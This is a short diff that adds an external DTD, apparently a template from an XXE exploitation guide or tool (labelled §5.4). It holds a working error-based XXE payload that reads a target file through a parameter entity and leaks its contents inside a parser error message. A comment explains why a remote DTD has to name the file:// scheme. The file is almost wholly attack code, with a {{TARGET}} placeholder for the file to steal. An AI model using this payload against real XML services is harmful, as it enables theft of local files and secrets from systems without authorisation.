@@ -1,0 +1,11 @@
+<!-- §5.4 - external DTD for the error-based channel: force a failure on a
+     path that carries the stolen data, and read it out of the error message.
+
+     Note the explicit file:// on %file. Inside a DTD fetched over HTTP the base URI
+     is that HTTP URL, so a scheme-less path - even an absolute one - is resolved
+     against it and fetched back from the attacker's own server instead of the
+     target's disk. A remote DTD must name the scheme. -->
+<!ENTITY % file SYSTEM "file://{{TARGET}}">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
